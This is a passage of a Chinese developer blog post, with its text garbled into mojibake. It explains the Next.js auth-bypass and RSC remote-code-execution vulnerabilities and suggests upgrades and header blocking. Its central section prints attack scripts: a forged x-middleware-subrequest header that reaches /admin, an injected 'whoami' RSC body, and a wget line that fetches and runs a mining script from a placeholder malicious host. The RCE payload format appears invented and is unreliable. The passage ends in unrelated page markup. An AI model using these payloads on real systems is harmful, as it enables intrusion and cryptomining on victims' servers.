<h4 data-id="heading-4">3. æ ¸å¿ƒå±å®³ï¼ˆå‰ç«¯èƒ½æ„ŸçŸ¥çš„å½±å“ï¼‰</h4>
<ul>
<li>
<p>ç»•è¿‡æ¼æ´ï¼šåˆ«äººä¸ç”¨ç™»å½•å°±èƒ½è¿›åå°ï¼ˆå¦‚ <code>/admin</code>ï¼‰ï¼Œå·æ•æ„Ÿæ•°æ®ã€ç¯¡æ”¹å†…å®¹ã€‚</p>
</li>
<li>
<p>RCE æ¼æ´ï¼šæœ€è‡´å‘½ï¼æ”»å‡»è€…èƒ½æ“æ§æœåŠ¡å™¨ï¼Œå·æ•°æ®åº“å¯†ç ã€æ¤å…¥æŒ–çŸ¿ç¨‹åºï¼ˆè®©æœåŠ¡å™¨å˜ â€œè‚‰é¸¡â€ï¼‰ã€åˆ é™¤ä¸šåŠ¡æ•°æ®ï¼Œç”šè‡³ç˜«ç—ªæœåŠ¡ã€‚</p>
</li>
</ul>
<h4 data-id="heading-5">4. å¿«é€Ÿé¢„é˜²æ–¹æ¡ˆï¼ˆå‰ç«¯ç›´æ¥èƒ½ç”¨ï¼‰</h4>
<ol>
<li>
<p>ä¼˜å…ˆå‡çº§ï¼šæŒ‰ç‰ˆæœ¬å¯¹åº”å‡çº§ï¼ˆ15.xâ†’â‰¥15.3.6ï¼›14.xâ†’â‰¥14.2.25ï¼›13.xâ†’â‰¥13.5.9ï¼‰ã€‚</p>
</li>
<li>
<p>ä¸´æ—¶é˜²æŠ¤ï¼šç”¨ Nginx/Cloudflare æ‹¦æˆª <code>x-middleware-subrequest</code> è¯·æ±‚å¤´ï¼ˆç¦æ­¢å¤–éƒ¨æäº¤ï¼‰ã€‚</p>
</li>
<li>
<p>ä»£ç å±‚é¢ï¼šå…³é”®è·¯ç”±ï¼ˆå¦‚ç™»å½•ã€æ”¯ä»˜ï¼‰ä¸è¦åªé ä¸­é—´ä»¶æ ¡éªŒï¼ŒåŠ äºŒæ¬¡éªŒè¯ï¼ˆå¦‚æ¥å£å±‚æŸ¥ token æœ‰æ•ˆæ€§ï¼‰ã€‚</p>
</li>
</ol>
<h4 data-id="heading-6">5. æ¶‰åŠæ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼ˆå‰ç«¯å…³è”æŠ€èƒ½ï¼‰</h4>
<ul>
<li>
<p>Next.js ä¸­é—´ä»¶ï¼šè¿è¡Œåœ¨è¯·æ±‚æœ€å‰é¢çš„æ ¡éªŒé€»è¾‘ï¼Œä¸æ˜¯å‰ç«¯ä»£ç ï¼Œæ˜¯æœåŠ¡ç«¯è½»é‡å‡½æ•°ã€‚</p>
</li>
<li>
<p>RSCï¼ˆReact Server Componentsï¼‰ï¼šApp Router æ ¸å¿ƒï¼ŒæœåŠ¡ç«¯æ¸²æŸ“ç»„ä»¶çš„åè®®ï¼Œæ•°æ®ä¼ è¾“è¦æ ¡éªŒã€‚</p>
</li>
<li>
<p>è¯·æ±‚ä¼ªé€ ï¼šå®¢æˆ·ç«¯å¯ç¯¡æ”¹è¯·æ±‚å¤´ / è¯·æ±‚ä½“ï¼ŒæœåŠ¡ç«¯ä¸èƒ½ â€œæ— æ¡ä»¶ä¿¡ä»»â€ã€‚</p>
</li>
<li>
<p>ä¾èµ–å®‰å…¨ï¼šæ¡†æ¶åº•å±‚æ¼æ´åªèƒ½é å‡çº§ä¿®å¤ï¼Œå®šæœŸç”¨ <code>npm audit</code> æŸ¥æ¼æ´ã€‚</p>
</li>
</ul>
<hr/>
<h3 data-id="heading-7">äºŒã€æ”»å‡»ä»£ç ç¤ºä¾‹ï¼ˆä»…ç”¨äºå­¦ä¹ ï¼Œä¸¥ç¦éæ³•ä½¿ç”¨ï¼‰</h3>
<blockquote>
<p>âš ï¸ æ³¨æ„äº‹é¡¹ï¼š</p>
</blockquote>
<ol>
<li>
<p>ä»¥ä¸‹ä»£ç ä»…ç”¨äº <strong>æ¼æ´åŸç†å­¦ä¹ </strong>ï¼Œä¸¥ç¦ç”¨äºæ”»å‡»çœŸå®ç½‘ç«™ï¼Œå¦åˆ™éœ€æ‰¿æ‹…æ³•å¾‹è´£ä»»ï¼</p>
</li>
<li>
<p>æµ‹è¯•ä»…å…è®¸åœ¨è‡ªå·±æ­å»ºçš„æ¼æ´ç¯å¢ƒï¼ˆå¦‚æœ¬åœ°éƒ¨ç½²å—å½±å“ç‰ˆæœ¬çš„ Next.js é¡¹ç›®ï¼‰ä¸­è¿›è¡Œã€‚</p>
</li>
<li>
<p>æ¼”ç¤ºè„šæœ¬èšç„¦ â€œæ”»å‡»æ ¸å¿ƒé€»è¾‘â€ï¼Œçœç•¥äº†çœŸå®æ”»å‡»ä¸­çš„æ‰«æã€æŒä¹…åŒ–ç­‰æ­¥éª¤ï¼Œçªå‡º â€œå¦‚ä½•è§¦å‘æ¼æ´â€ã€‚</p>
</li>
</ol>
<h4 data-id="heading-8">ï¼ˆä¸€ï¼‰CVE-2025-29927ï¼ˆèº«ä»½éªŒè¯ç»•è¿‡æ¼æ´ï¼‰æ”»å‡»ç¤ºä¾‹</h4>
<h5 data-id="heading-9">æ¼æ´æ ¸å¿ƒ</h5>
<p>ä¼ªé€  <code>x-middleware-subrequest</code> è¯·æ±‚å¤´ï¼Œç»•è¿‡ä¸­é—´ä»¶çš„ç™»å½•æ ¡éªŒï¼Œç›´æ¥è®¿é—®å—ä¿æŠ¤è·¯ç”±ï¼ˆå¦‚ <code>/admin</code>ï¼‰ã€‚</p>
<h5 data-id="heading-10">æ”»å‡»è„šæœ¬ï¼š<code>bypass-auth.js</code></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// éœ€å…ˆæ‰§è¡Œï¼šnpm install axios</span>

<span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">'axios'</span>);

<span class="hljs-comment">// ç›®æ ‡åœ°å€ï¼ˆè‡ªå·±æ­å»ºçš„æµ‹è¯•é¡¹ç›®ï¼‰</span>

<span class="hljs-keyword">const</span> targetUrl = <span class="hljs-string">'http://localhost:3000/admin'</span>;

<span class="hljs-comment">// æ ¸å¿ƒï¼šä¼ªé€ è¯·æ±‚å¤´ï¼Œè§¦å‘ä¸­é—´ä»¶ç»•è¿‡</span>

<span class="hljs-keyword">const</span> attackConfig = {

   <span class="hljs-attr">headers</span>: {

     <span class="hljs-comment">// å…³é”®ï¼šæ‹¼æ¥ 5 æ¬¡åˆæ³•æ ‡è¯†ï¼Œè§¦å‘æ–°ç‰ˆæœ¬æ¼æ´ç»•è¿‡</span>

     <span class="hljs-string">'x-middleware-subrequest'</span>: <span class="hljs-string">'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'</span>,

     <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span> <span class="hljs-comment">// ä¼ªè£…æµè§ˆå™¨</span>

   }

};

<span class="hljs-comment">// å‘é€æ”»å‡»è¯·æ±‚</span>

axios.<span class="hljs-title function_">get</span>(targetUrl, attackConfig)

   .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”»å‡»ç»“æœï¼š'</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çŠ¶æ€ç ï¼š'</span>, response.<span class="hljs-property">status</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å“åº”å†…å®¹ï¼ˆå‰500å­—ç¬¦ï¼‰ï¼š'</span>, response.<span class="hljs-property">data</span>.<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">500</span>));

     <span class="hljs-keyword">if</span> (response.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>) {

       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'âœ… èº«ä»½éªŒè¯ç»•è¿‡æˆåŠŸï¼å·²è®¿é—®å—ä¿æŠ¤çš„ /admin è·¯ç”±'</span>);

     }

   })

   .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”»å‡»å¤±è´¥ï¼š'</span>, error.<span class="hljs-property">message</span>);

   });
</code></pre>
<h5 data-id="heading-11">æµ‹è¯•ç¯å¢ƒæ­å»ºï¼ˆæœ¬åœ°å¤ç°ç”¨ï¼‰</h5>
<ol>
<li>æ–°å»ºå—å½±å“ç‰ˆæœ¬çš„ Next.js é¡¹ç›®ï¼ˆå¦‚ 15.2.2ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-lua" lang="lua">npx <span class="hljs-built_in">create</span>-<span class="hljs-built_in">next</span>-app@<span class="hljs-number">15.2</span><span class="hljs-number">.2</span> test-vuln-project

cd test-vuln-project
</code></pre>
<ol>
<li>åˆ›å»ºä¸­é—´ä»¶ <code>src/middleware.js</code>ï¼ˆæ¨¡æ‹Ÿç™»å½•æ ¡éªŒï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">NextResponse</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/server'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">req</span>) {

   <span class="hljs-comment">// ç®€å•æ ¡éªŒï¼šæ²¡æœ‰ç™»å½• cookie å°±æ‹¦æˆªè·³è½¬åˆ°ç™»å½•é¡µ</span>

   <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>) {

     <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">redirect</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'/login'</span>, req.<span class="hljs-property">url</span>));

   }

   <span class="hljs-keyword">return</span> <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();

}

<span class="hljs-comment">// ä»…å¯¹ /admin è·¯ç”±ç”Ÿæ•ˆ</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> config = { <span class="hljs-attr">matcher</span>: <span class="hljs-string">'/admin'</span> };
</code></pre>
<ol>
<li>åˆ›å»º <code>/admin</code> é¡µé¢ <code>app/admin/page.js</code>ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">AdminPage</span>(<span class="hljs-params"/>) {

   <span class="hljs-keyword">return</span> åå°ï¼ˆä»…ç™»å½•å¯è§ï¼‰\&lt;/h1&gt;;

}
</code></pre>
<h5 data-id="heading-12">è¿è¡Œæ­¥éª¤</h5>
<ol>
<li>
<p>å¯åŠ¨æµ‹è¯•é¡¹ç›®ï¼š<code>npm run dev</code></p>
</li>
<li>
<p>è¿è¡Œæ”»å‡»è„šæœ¬ï¼š<code>node bypass-auth.js</code></p>
</li>
<li>
<p>é¢„æœŸç»“æœï¼šæ— éœ€ç™»å½• cookieï¼Œæ§åˆ¶å°è¾“å‡º 200 çŠ¶æ€ç å’Œ admin é¡µé¢å†…å®¹ï¼Œç»•è¿‡æˆåŠŸã€‚</p>
</li>
</ol>
<hr/>
<h4 data-id="heading-13">ï¼ˆäºŒï¼‰CVE-2025-66478ï¼ˆRSC è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰æ”»å‡»ç¤ºä¾‹</h4>
<h5 data-id="heading-14">æ¼æ´æ ¸å¿ƒ</h5>
<p>æ„é€ ç¬¦åˆ RSC åè®®æ ¼å¼çš„ POST è¯·æ±‚ä½“ï¼Œæ³¨å…¥ç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚ <code>whoami</code>ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šç›´æ¥æ‰§è¡Œè¯¥å‘½ä»¤ã€‚</p>
<h5 data-id="heading-15">æ”»å‡»è„šæœ¬ï¼š<code>rce-attack.js</code></h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// éœ€å…ˆæ‰§è¡Œï¼šnpm install axios</span>

<span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">'axios'</span>);

<span class="hljs-comment">// ç›®æ ‡åœ°å€ï¼ˆå¯ç”¨ App Router çš„å—å½±å“ç‰ˆæœ¬é¡¹ç›®ï¼‰</span>

<span class="hljs-keyword">const</span> targetUrl = <span class="hljs-string">'http://localhost:3000'</span>;

<span class="hljs-comment">// æ ¸å¿ƒï¼šæ„é€  RSC åè®®çš„æ¶æ„è¯·æ±‚ä½“ï¼Œæ³¨å…¥ç³»ç»Ÿå‘½ä»¤</span>

<span class="hljs-keyword">const</span> maliciousBody = {

   <span class="hljs-comment">// RSC åè®®å›ºå®šæ ¼å¼å­—æ®µï¼ˆç®€åŒ–ç‰ˆï¼Œæ¨¡æ‹Ÿåˆæ³•è¯·æ±‚ï¼‰</span>

   <span class="hljs-attr">id</span>: <span class="hljs-string">'123'</span>,

   <span class="hljs-attr">chunks</span>: \[

     <span class="hljs-comment">// æ³¨å…¥æ¶æ„å‘½ä»¤ï¼šWindows ç”¨ "whoami"ï¼ŒLinux/Mac ç”¨ "id"</span>

     <span class="hljs-string">'{"type":"invoke","args":\[";whoami;"]}'</span>

   ],

   <span class="hljs-attr">version</span>: <span class="hljs-string">'0.1'</span>,

   <span class="hljs-attr">mode</span>: <span class="hljs-string">'server-component'</span>

};

<span class="hljs-comment">// å‘é€æ”»å‡»è¯·æ±‚ï¼ˆRSC æ¼æ´é€šè¿‡ POST / è§¦å‘ï¼‰</span>

axios.<span class="hljs-title function_">post</span>(targetUrl, maliciousBody, {

   <span class="hljs-attr">headers</span>: {

     <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,

     <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/x-component'</span> <span class="hljs-comment">// RSC åè®®è¦æ±‚çš„ Accept å¤´</span>

   }

})

   .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”»å‡»ç»“æœï¼š'</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çŠ¶æ€ç ï¼š'</span>, response.<span class="hljs-property">status</span>);

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å“åº”å†…å®¹ï¼š'</span>, response.<span class="hljs-property">data</span>);

     <span class="hljs-comment">// æ ¡éªŒå‘½ä»¤æ‰§è¡Œç»“æœï¼ˆåŒ…å«è·¯å¾„åˆ†éš”ç¬¦å³ä¸ºæˆåŠŸï¼‰</span>

     <span class="hljs-keyword">if</span> (response.<span class="hljs-property">data</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/'</span>) || response.<span class="hljs-property">data</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'\\\\'</span>)) {

       <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'âœ… è¿œç¨‹ä»£ç æ‰§è¡ŒæˆåŠŸï¼å·²è·å–æœåŠ¡å™¨ç”¨æˆ·ä¿¡æ¯'</span>);

     }

   })

   .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {

     <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”»å‡»å¤±è´¥ï¼š'</span>, error.<span class="hljs-property">response</span>?.<span class="hljs-property">data</span> || error.<span class="hljs-property">message</span>);

   });
</code></pre>
<h5 data-id="heading-16">æµ‹è¯•ç¯å¢ƒæ­å»ºï¼ˆæœ¬åœ°å¤ç°ç”¨ï¼‰</h5>
<ol>
<li>æ–°å»ºå—å½±å“ç‰ˆæœ¬çš„ Next.js é¡¹ç›®ï¼ˆå¦‚ 15.3.3ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-lua" lang="lua">npx <span class="hljs-built_in">create</span>-<span class="hljs-built_in">next</span>-app@<span class="hljs-number">15.3</span><span class="hljs-number">.3</span> test-rce-project

cd test-rce-project
</code></pre>
<ol>
<li>å¯ç”¨ App Routerï¼ˆé»˜è®¤å·²å¯ç”¨ï¼Œç¡®ä¿ <code>app/page.js</code> å­˜åœ¨ï¼‰ï¼š</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// app/page.js</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {

   <span class="hljs-keyword">return</span> &gt;<span class="hljs-title class_">Next</span>.<span class="hljs-property">js</span> <span class="hljs-title class_">App</span> <span class="hljs-title class_">Router</span> æµ‹è¯•é¡µ;

}
</code></pre>
<h5 data-id="heading-17">è¿è¡Œæ­¥éª¤</h5>
<ol>
<li>
<p>å¯åŠ¨æµ‹è¯•é¡¹ç›®ï¼š<code>npm run dev</code></p>
</li>
<li>
<p>è¿è¡Œæ”»å‡»è„šæœ¬ï¼š<code>node rce-attack.js</code></p>
</li>
<li>
<p>é¢„æœŸç»“æœï¼š</p>
</li>
</ol>
<ul>
<li>
<p>Windows ç³»ç»Ÿï¼šå“åº”ä¸­è¿”å› <code>DESKTOP-XXX\ç”¨æˆ·å</code></p>
</li>
<li>
<p>Linux/Mac ç³»ç»Ÿï¼šå“åº”ä¸­è¿”å› <code>www-data</code> æˆ–å½“å‰ç”¨æˆ·èº«ä»½</p>
</li>
<li>
<p>æ§åˆ¶å°è¾“å‡º â€œè¿œç¨‹ä»£ç æ‰§è¡ŒæˆåŠŸâ€</p>
</li>
</ul>
<blockquote>
<p>ğŸ“Œ æ³¨ï¼šçœŸå®æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä¼šå°†</p>
<p><code>whoami</code></p>
<p>æ›¿æ¢ä¸ºæ¶æ„å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š</p>
</blockquote>
<pre><code class="hljs language-json" lang="json">'<span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span><span class="hljs-string">"invoke"</span><span class="hljs-punctuation">,</span><span class="hljs-attr">"args"</span><span class="hljs-punctuation">:</span>\<span class="hljs-punctuation">[</span><span class="hljs-string">";wget http://æ¶æ„åœ°å€/æŒ–çŸ¿è„šæœ¬.sh &amp;&amp; chmod +x æŒ–çŸ¿è„šæœ¬.sh &amp;&amp; ./æŒ–çŸ¿è„šæœ¬.sh;"</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">}</span>'
</code></pre>
<p>æœ¬ç¤ºä¾‹ä»…ç”¨ <code>whoami</code> æ¼”ç¤ºåŸç†ï¼Œåˆ‡å‹¿ç”¨äºéæ³•ç”¨é€”ã€‚</p>
<hr/>
<h3 data-id="heading-18">ä¸‰ã€å‰ç«¯å…³é”®æé†’</h3>
<ol>
<li>
<p><strong>æ¼æ´æœ¬è´¨</strong>ï¼šéƒ½æ˜¯ â€œä¿¡ä»»äº†å®¢æˆ·ç«¯è¾“å…¥â€â€”â€” ä¸­é—´ä»¶ä¿¡äº†ä¼ªé€ çš„è¯·æ±‚å¤´ï¼ŒæœåŠ¡å™¨ä¿¡äº†ä¼ªé€ çš„ RSC æ•°æ®ï¼Œæ ¸å¿ƒæ˜¯ â€œæœåŠ¡ç«¯æœªåšä¸¥æ ¼æ ¡éªŒâ€ã€‚</p>
</li>
<li>
<p><strong>ä¿®å¤åŸåˆ™</strong>ï¼šæ¡†æ¶åº•å±‚æ¼æ´ï¼Œå‰ç«¯ä»£ç æ— æ³•ç›´æ¥é˜²å¾¡ï¼å¿…é¡»å‡çº§ Next.js åˆ°å®‰å…¨ç‰ˆæœ¬ï¼ˆè¿™æ˜¯æœ€æ ¹æœ¬ã€æœ€é è°±çš„æ–¹æ¡ˆï¼‰ã€‚</p>
</li>
<li>
<p><strong>é¢å¤–é˜²æŠ¤</strong>ï¼š</p>
</li>
</ol>
<ul>
<li>
<p>å…³é”®è·¯ç”±ï¼ˆç™»å½•ã€æ”¯ä»˜ã€åå°ï¼‰å¿…é¡»åŠ  â€œåŒé‡æ ¡éªŒâ€ï¼ˆä¸­é—´ä»¶ + æ¥å£å±‚ token éªŒè¯ï¼‰ï¼Œä¸è¦å•é ä¸­é—´ä»¶ã€‚</p>
</li>
<li>
<p>è‡ªæ‰˜ç®¡é¡¹ç›®éœ€åœ¨ Nginx/Cloudflare å±‚æ‹¦æˆªæ¶æ„è¯·æ±‚å¤´ï¼ˆå¦‚ <code>x-middleware-subrequest</code>ï¼‰ã€‚</p>
</li>
</ul>
<ol>
<li><strong>æ—¥å¸¸ä¹ æƒ¯</strong>ï¼š</li>
</ol>
<ul>
<li>
<p>å®šæœŸæ‰§è¡Œ <code>npm audit</code> æ‰«æä¾èµ–æ¼æ´ï¼ŒåŠæ—¶æ›´æ–°è¡¥ä¸ç‰ˆæœ¬ã€‚</p>
</li>
<li>
<p>å…³é”®ä¸šåŠ¡ä¼˜å…ˆä½¿ç”¨ Vercel æ‰˜ç®¡ï¼ˆå®˜æ–¹è‡ªå¸¦æ¼æ´é˜²æŠ¤ï¼Œè‡ªåŠ¨å±è”½éƒ¨åˆ†æ”»å‡»ï¼‰ã€‚</p>
</li>
<li>
<p>æœåŠ¡å™¨å¯ç”¨ä¸»æœºå®‰å…¨å·¥å…·ï¼Œç›‘æ§å¼‚å¸¸è¿›ç¨‹å’Œæ–‡ä»¶ä¸‹è½½ã€‚</p>
</li>
</ul>
<blockquote>
<p>æœ€åæ„Ÿè°¢é˜…è¯»ï¼æ¬¢è¿å…³æ³¨æˆ‘ï¼Œå¾®ä¿¡å…¬ä¼—å·ï¼š<code>ã€Šé²«å°é±¼ä¸æ­£ç»ã€‹</code>ã€‚æ¬¢è¿ç‚¹èµã€æ”¶è—ã€å…³æ³¨ï¼Œä¸€é”®ä¸‰è¿ï¼ï¼ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯æ•°æ®å­—å…¸æŠ€æœ¯æ–¹æ¡ˆå®æˆ˜]]></title>    <link>https://juejin.cn/post/7581750253000425507</link>    <guid>https://juejin.cn/post/7581750253000425507</guid>    <pubDate>2025-12-10T02:24:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581750253000425507" data-draft-id="7581752787564052520" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯æ•°æ®å­—å…¸æŠ€æœ¯æ–¹æ¡ˆå®æˆ˜"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,æ¶æ„"/> <meta itemprop="datePublished" content="2025-12-10T02:24:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ ‘æ·±é‡é¹¿"/> <meta itemprop="url" content="https://juejin.cn/user/3281394147006381"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯æ•°æ®å­—å…¸æŠ€æœ¯æ–¹æ¡ˆå®æˆ˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3281394147006381/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ ‘æ·±é‡é¹¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T02:24:05.000Z" title="Wed Dec 10 2025 02:24:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto;border:3px solid rgba(62,175,124,.2)}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-weight:700;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:6px;border:2px solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c}.markdown-body a:active,.markdown-body a:hover{border-bottom:1.5px solid #3eaf7c}.markdown-body a:before{content:"â‡²"}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(62,175,124,.2)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:.5rem solid;border-color:#42b983;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol 